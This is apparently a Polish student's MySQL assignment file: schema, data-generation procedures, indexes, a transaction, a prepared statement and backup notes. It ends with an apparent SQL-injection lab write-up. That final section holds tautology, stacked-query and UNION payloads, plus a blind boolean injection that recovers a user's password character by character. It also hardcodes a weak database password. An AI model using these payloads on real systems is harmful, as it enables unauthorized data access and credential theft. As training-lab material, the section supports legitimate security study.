-- 1)

CREATE DATABASE firma;

CREATE USER 'szef'@'localhost' IDENTIFIED BY 'szef123';
GRANT ALL PRIVILEGES ON firma.* TO 'szef'@'localhost';

CREATE TABLE firma.Ludzie (
    PESEL VARCHAR(11) PRIMARY KEY NOT NULL, --  Pesel to dobry klucz ponieważ jest unikalny
    Imie VARCHAR(30) NOT NULL,
    Nazwisko VARCHAR(30) NOT NULL,
    Data_urodzenia DATE NOT NULL,
    Plec ENUM('M', 'K') NOT NULL,
    CHECK (PESEL REGEXP '^[0-9]{11}$')
);

CREATE TABLE firma.Zawody (
    zawod_id INT PRIMARY KEY NOT NULL AUTO_INCREMENT,
    nazwa VARCHAR(50) NOT NULL,
    pensja_min float NOT NULL,
    pensja_max float NOT NULL,
    CHECK (pensja_min < pensja_max)
);

CREATE TABLE firma.Pracownicy (
    PESEL CHAR(11) NOT NULL,
    zawod_id INT NOT NULL,
    pensja float NOT NULL,
    FOREIGN KEY (PESEL) REFERENCES firma.Ludzie(PESEL),
    FOREIGN KEY (zawod_id) REFERENCES firma.Zawody(zawod_id)
);

-- Insert into Ludzie 5 records
INSERT INTO firma.Ludzie (PESEL, Imie, Nazwisko, Data_urodzenia, Plec)
VALUES ('05251178211', 'Jacek', 'Kowalski', '2005-05-11', 'M'),
       ('05232378312', 'Jadek', 'Kowblski', '2005-03-23', 'M'),
       ('06273078413', 'Jagek', 'Kowclski', '2006-07-30', 'M'),
       ('07300178514', 'Jahek', 'Kowdlski', '2007-10-01', 'M'),
       ('08311478715', 'Jaiek', 'Kowelski', '2008-11-14', 'M');


DELIMITER $$
DROP procedure IF EXISTS `firma`.`generateCzlowiek`$$
CREATE PROCEDURE `firma`.`generateCzlowiek`(a INT, b INT)
BEGIN
    DECLARE p VARCHAR(11);
    DECLARE i VARCHAR(30);
    DECLARE n VARCHAR(30);
    DECLARE d DATE;
    DECLARE pl ENUM('M', 'K');

    -- pl as M or K
    SET pl = IF(RAND() < 0.5, 'M', 'K');
    SET i = IF(pl = 'M', 'Jan', 'Anna');
    SET n = IF(pl = 'M', 'Kowalski', 'Kowalska');
    -- between 18 and 60 years old
    SET d = DATE_ADD(NOW(), INTERVAL -FLOOR(RAND() * 365 * (b-a) + 365 * a) DAY);
    -- PESEL
    SET p = CONCAT(
        DATE_FORMAT(d, '%y%m%d'),
        LPAD(FLOOR(RAND() * 999), 3, '0'),
        IF(pl = 'M', FLOOR(RAND() * 5) * 2 + 1, FLOOR(RAND() * 5) * 2)
    );
    -- PESEL checksum
    SET p = CONCAT(p, MOD(
        9 * SUBSTRING(p, 1, 1) +
        7 * SUBSTRING(p, 2, 1) +
        3 * SUBSTRING(p, 3, 1) +
        1 * SUBSTRING(p, 4, 1) +
        9 * SUBSTRING(p, 5, 1) +
        7 * SUBSTRING(p, 6, 1) +
        3 * SUBSTRING(p, 7, 1) +
        1 * SUBSTRING(p, 8, 1) +
        9 * SUBSTRING(p, 9, 1) +
        7 * SUBSTRING(p, 10, 1), 10)
    );    
    -- insert into table
    INSERT INTO firma.Ludzie (PESEL, Imie, Nazwisko, Data_urodzenia, Plec)
    VALUES (p, i, n, d, pl);
END$$
DELIMITER ;

-- Create method calling generateCzlowiek n times
DELIMITER $$
DROP procedure IF EXISTS `firma`.`generateLudzie`$$
CREATE PROCEDURE `firma`.`generateLudzie`(n INT, a INT, b INT)
BEGIN
    DECLARE i INT DEFAULT 0;
    WHILE i < n DO
        CALL firma.generateCzlowiek(a,b);
        SET i = i + 1;
    END WHILE;
END$$
DELIMITER ;

-- Insert into Zawody polityk, nauczyciel, lekarz, informatyk
INSERT INTO firma.Zawody (nazwa, pensja_min, pensja_max)
VALUES ('polityk', 3000, 25000),
       ('nauczyciel', 2500, 4000),
       ('informatyk', 7000, 30000),
       ('lekarz', 5000, 12000);

-- Create procedure to assign random job to adults
DELIMITER $$
DROP procedure IF EXISTS `firma`.`assignJob`$$
CREATE PROCEDURE `firma`.`assignJob`()
BEGIN
    DECLARE done INT DEFAULT FALSE;
    DECLARE p VARCHAR(11);
    DECLARE d DATE;
    DECLARE pl ENUM('M', 'K');
    DECLARE z INT;
    DECLARE pe INT;
    -- declare cursor
    DECLARE cur1 CURSOR FOR
        SELECT PESEL,Data_urodzenia,Plec FROM firma.Ludzie
        WHERE DATEDIFF(NOW(), Data_urodzenia) > 365 * 18;
    -- declare handler
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
    -- open cursor
    OPEN cur1;
        read_loop: LOOP
            FETCH cur1 INTO p, d, pl;
            IF done THEN
                LEAVE read_loop;
            END IF;
            -- assign job
            IF DATEDIFF(NOW(), d) < 365 * IF(pl = 'M', 65, 60) THEN
                -- any job
                SET z = FLOOR(RAND() * 4) + 1;
                -- random value from pesnja_min to pensja_max
            ELSE
                -- any job except lekarz
                SET z = FLOOR(RAND() * 3) + 1;
            END IF;
            SET pe = FLOOR(RAND() * ((SELECT pensja_max FROM firma.Zawody WHERE zawod_id = z) - (SELECT pensja_min FROM firma.Zawody WHERE zawod_id = z)) + (SELECT pensja_min FROM firma.Zawody WHERE zawod_id = z));
            -- insert into table
            INSERT INTO firma.Pracownicy (PESEL, zawod_id, pensja)
            VALUES (p, z, pe);
        END LOOP;
    -- close cursor
    CLOSE cur1;
END$$
DELIMITER ;

-- 2)
ALTER TABLE firma.Ludzie ADD INDEX (Plec, Imie);
ALTER TABLE firma.Pracownicy ADD INDEX (pensja);

SHOW INDEX FROM firma.Ludzie;
SHOW INDEX FROM firma.Pracownicy;
DROP 

EXPLAIN select * from firma.Ludzie where Plec = 'M' and Imie = 'Anna';

SELECT * FROM firma.Ludzie WHERE Plec = 'K' AND Imie LIKE 'A%';
SELECT * FROM firma.Ludzie WHERE Plec = 'M';
SELECT * FROM firma.Ludzie WHERE Imie LIKE 'K%';
SELECT * FROM firma.Ludzie WHERE PESEL in (SELECT PESEL FROM firma.Pracownicy WHERE pensja < 2000);
SELECT * FROM firma.Ludzie WHERE Plec = 'M' AND PESEL in (SELECT PESEL FROM firma.Pracownicy WHERE pensja > 10000);

-- W tabeli Ludzie mamy indeksy na kolumnach PESEL, (Plec, Imie)
-- w Practownicy mamy indeks na kolumnie PESEL, zawod_id, pensja

-- Optymalizator zoptymalizuje zapytanie 1, 2 , 4, 5

-- 3)

DELIMITER $$
DROP procedure IF EXISTS `firma`.`podwyzka`$$
CREATE PROCEDURE `firma`.`podwyzka`(n VARCHAR(50))
BEGIN
    DECLARE zid INT;
    SET zid = (SELECT zawod_id FROM firma.Zawody WHERE nazwa = n);
    START TRANSACTION;
    UPDATE firma.Pracownicy SET pensja = pensja * 1.05 WHERE zawod_id = zid;

    IF EXISTS (SELECT * FROM firma.Pracownicy WHERE pensja > (SELECT pensja_max FROM firma.Zawody WHERE zawod_id = zid)) THEN
        ROLLBACK;
    ELSE
        COMMIT;
    END IF;
END$$
DELIMITER ;

-- 4)

PREPARE countWomen FROM 'SELECT COUNT(*)
FROM firma.Ludzie l JOIN firma.Pracownicy p
ON l.PESEL = p.PESEL
WHERE l.Plec = "K" AND 
p.zawod_id in (SELECT zawod_id FROM firma.Zawody WHERE nazwa = ?)';

EXECUTE countWomen USING 'polityk';

-- 5)

-- > mkdir./dbbackup
-- > mysqldump -u szef -p firma > ./dbbackup/firma.dump.sql
DROP DATABASE firma;
CREATE DATABASE firma;
-- > mysql -u szef -p firma < ./dbbackup/firma.dump.sql

-- Backup pełny - wszystkie dane
-- Backup różnicowy - tylko zmienione dane od ostatniego backupu pełnego

-- 6)

-- intro
SELECT department FROM Employees WHERE CONCAT(first_name, ' ', last_name) = 'Bob Franco';
UPDATE Employees SET department = 'Sales' WHERE CONCAT(first_name, ' ', last_name) = 'Tobi Barnett';
ALTER TABLE employees ADD COLUMN phone VARCHAR(20);
GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user;
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1';
SELECT * From user_data WHERE Login_Count = 1 and userid= 2 OR 1=1;
-- SELECT"'; GRANT ALL PRIVILEGES ON access_log TO public; drop table access_log; SELECT * from employees where last_name='

-- advanced

-- Smith' OR 1=1 UNION select * from user_system_data where '1'='1
-- SELECT * FROM user_data WHERE last_name = 'Smith';select * from user_system_data where '1'='1'

-- W piątym doszedłem do tego że login jest vulnerable i zwraca: 
-- 'User 123' or 1=1-- already exists please try to register with a different username.' na true
-- 'User Tom' and 1=2-- created, please proceed to the login page.' na false

-- Więc jest tam jakiś If Exists select * from users where username = 'Tom' or 1=1--...

-- name: Jacek
-- password: haslo

-- Jacek' and password='haslo'-- true
-- Jacek' and password='hasl'-- false

-- Jacek' and LENGTH(password)=5-- true
-- Jacek' and LENGTH(password)=4-- false

-- Tom' and LENGTH(password) between 1 and 10-- true
-- Tom' and LENGTH(password) between 8 and 10-- true
-- Tom' and LENGTH(password) between 8 and 8-- true
-- Długość hasła to 8

-- Tom' and ASCII(SUBSTRING(password, 1, 1))<91-- true
-- Tom' and ASCII(SUBSTRING(password, 1, 1))<81<-- true etc.
-- Tom' and ASCII(SUBSTRING(password, 1, 1))<51 -- false

-- Pierwsza litera to 3
-- Druga litera to 2
-- Trzecia litera to 3
-- Czwarta litera to 2
-- Piąta litera to 1
-- Szósta litera to 3
-- Siódma litera to 2
-- Ósma litera to 1

-- Tom' OR password='32321321'-- true